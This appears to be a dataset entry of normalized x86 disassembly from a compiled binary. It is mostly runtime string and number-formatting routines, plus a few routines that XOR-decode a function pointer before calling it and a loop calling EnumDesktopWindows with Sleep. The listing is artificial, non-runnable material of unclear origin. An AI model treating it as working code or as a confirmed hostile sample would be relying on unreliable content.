lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x19c ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x26
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x98 ]
mov eax 0x8
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x27
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x118 ]
mov eax 0x19
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x118 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x28
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xe8 ]
mov eax 0x9
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x29
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xf8 ]
mov eax 0x14
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xf8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2a
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xa0 ]
mov eax 0x15
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2b
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x1a4 ]
mov eax 0xa
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1a4 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2c
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x138 ]
mov eax 0x27
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x138 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2d
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x88 ]
mov eax 0xc
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2e
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x110 ]
mov eax 0x63
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2f
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x120 ]
mov eax 0x41
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x30
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x108 ]
mov eax 0x40
call sub_10070810
mov eax edi
mov [ ebp - 0x15c ] 0xf
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x170 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp - 0x170 ]
call sub_10037e00
lea ecx [ ebp - 0x170 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x31
call sub_100553e0
cmp [ ebp - 0x15c ] 0x10
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x170 ]
push edx
call sub_100187af
add esp 0x4
sub_1003ba85
push 0x28
mov eax sub_100851bd
call sub_100624bc
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x18
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
push ecx
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_1005bf08
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
sub_1003bb10
push ebp
mov ebp esp
push 0xffffffff
push sub_100869de
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0xffffffff
xor ebx ebx
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_100404a0
push 0xffffffff
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] ebx
push ebx
lea eax [ edi + 0x1c ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_100404a0
mov [ ebp - 0x4 ] 0x1
mov cx [ edi + 0x38 ]
mov [ esi + 0x38 ] cx
push 0xffffffff
lea ecx [ esi + 0x3c ]
push ebx
lea eax [ edi + 0x3c ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_100404a0
push 0xffffffff
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] 0x2
push ebx
lea eax [ edi + 0x58 ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_100404a0
mov cl [ edi + 0x74 ]
mov [ esi + 0x74 ] cl
mov edx [ edi + 0x78 ]
mov [ esi + 0x78 ] edx
mov eax [ edi + 0x7c ]
mov [ esi + 0x7c ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1003bbe7
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x8c ]
call sub_1006c82b
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1005c1c5
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_1004b2f2
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x1c
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ ebp - 0x88 ]
fld [ ebp + 0x1c ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
mov [ ebp - 0x79 ] 0x0
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_1003bdb0
push ebp
mov ebp esp
push 0xffffffff
push sub_100883bc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
push eax
sub esp 0x1c
mov [ ebp - 0x94 ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x9c ] esp
mov [ ebp - 0x98 ] ecx
mov ecx esp
xor ebx ebx
push 0xffffffff
push ebx
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] bl
call sub_1004efe0
sub esp 0x1c
mov [ ebp - 0x4 ] ebx
mov edx [ ebp - 0x98 ]
mov ecx esp
mov [ ebp - 0xa0 ] esp
push 0xffffffff
push ebx
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] bl
call sub_1004efe0
mov eax [ ebp - 0x94 ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x98 ] esp
push 0xffffffff
push ebx
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] bl
call sub_1004efe0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x94 ] esp
push 0xffffffff
mov [ ebp - 0x4 ] 0x2
push ebx
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edi
mov [ ecx ] bl
call sub_1004efe0
lea edi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_1004e190
add esp 0x74
mov edi eax
push 0xffffffff
push ebx
push edi
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_100404a0
push 0xffffffff
push ebx
lea ecx [ edi + 0x1c ]
push ecx
lea ecx [ esi + 0x1c ]
call sub_100404a0
mov dx [ edi + 0x38 ]
push 0xffffffff
push ebx
lea eax [ edi + 0x3c ]
mov [ esi + 0x38 ] dx
push eax
lea ecx [ esi + 0x3c ]
call sub_100404a0
push 0xffffffff
push ebx
lea ecx [ edi + 0x58 ]
push ecx
lea ecx [ esi + 0x58 ]
call sub_100404a0
mov dl [ edi + 0x74 ]
mov [ esi + 0x74 ] dl
mov eax [ edi + 0x78 ]
mov [ esi + 0x78 ] eax
mov ecx [ edi + 0x7c ]
mov [ esi + 0x7c ] ecx
lea esi [ ebp - 0x90 ]
call sub_1002fbb0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1003bf29
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x6
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_1003bfa8
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10007908
fstp [ ebp - 0x4 ]
fld [ ebp - 0x4 ]
add esp 0x10
leave
retn
sub_1003bfdd
mov edi edi
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4c ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10056f45
add esp 0x18
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1003bfa8
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_10006b0d
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x20
sub_1003c09d
push 0xc
push r--data
call sub_1007fb20
call sub_1003512d
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_1007eff1
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003c0d3
mov eax [ ebp - 0x1c ]
call sub_1007fb65
retn
sub_1003c0f0
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ rw-data ]
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] 0x4
call [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_1003c132
push 0xc
mov eax sub_100854c2
call sub_10013486
mov esi ecx
mov [ ebp - 0x18 ] esi
mov edi [ ebp + 0x8 ]
or edi 0x7
cmp edi 0x7ffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax edi
pop ebx
div ebx
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp edx eax
jbe r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x1 ]
push 0x0
push eax
call sub_10059bb8
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov edi 0x7ffffffe
mov eax edi
sub eax edx
cmp ecx eax
ja r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
lea edi [ edx + ecx ]
push 0x0
push 0x1
mov ecx esi
call sub_1003c519
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
cmp edi 0x8
jae r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ eax + ebx * 2 ] cx
call sub_10013ab8
retn 0x8
mov eax esi
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea ecx [ ebx + ebx ]
push ecx
push eax
push [ ebp + 0x8 ]
call sub_1007f5d0
add esp 0xc
sub_1003c195
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10059bb8
pop ecx
mov [ ebp + 0x8 ] eax
pop ecx
mov eax r-xdata
retn
sub_1003c220
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ EnumDesktopWindows@IAT ]
push edi
mov edi [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax 0x258
jl r-xdata
push 0x64
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push esi
push sub_10051890
push ecx
mov [ esi ] 0x0
call ebx
cmp [ esi ] 0x0
jne r-xdata
sub_1003c280
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_1001f7a0
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003c2b0
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ rw-data ]
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] 0x5
call [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_1003c2f0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
cmp esi [ ebp + 0x10 ]
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
pop ebx
add esi 0x2
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
mov eax [ edx + 0x8 ]
push ebx
mov ecx edi
call eax
test al al
je r-xdata
sub_1003c326
push 0x60
mov eax sub_100853ac
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x24 ]
or edi 0xffffffff
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x50 ] edi
mov ecx esi
je r-xdata
lea eax [ ebp - 0x5c ]
xor ebx ebx
push eax
mov [ ebp - 0x58 ] ebx
call sub_10013950
mov esi [ esi + 0x14 ]
lea ecx [ ebp - 0x58 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x4
call sub_100424ab
add esp 0x18
push eax
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10060ef0
add esp 0x10
lea ecx [ ebp - 0x5c ]
mov esi eax
mov [ ebp - 0x4 ] edi
call sub_10034a80
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x6c ] eax
je r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_10013950
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_100188c2
pop ecx
lea ecx [ ebp - 0x50 ]
mov esi eax
mov [ ebp - 0x4 ] edi
call sub_10034a80
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
call sub_100405c0
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_1006e90e
push edi
push ebx
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_1005e580
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1002c8c0
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_1004ca10
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_10055b84
push edi
push ebx
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_1005e580
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1002c8c0
cmp [ ebp - 0x38 ] 0x10
mov eax [ ebp - 0x4c ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
mov eax [ ebp - 0x54 ]
je r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000723f
add esp 0x10
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] edi
call sub_1002c8c0
jmp r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x50 ] ebx
jge r-xdata
or [ eax ] 0x1
cmp esi 0x1
ja r-xdata
mov ecx [ ebp - 0x68 ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x60 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_1003c4e0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x8 ]
mov eax edx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] 0x0
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
sub_1003c519
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor eax eax
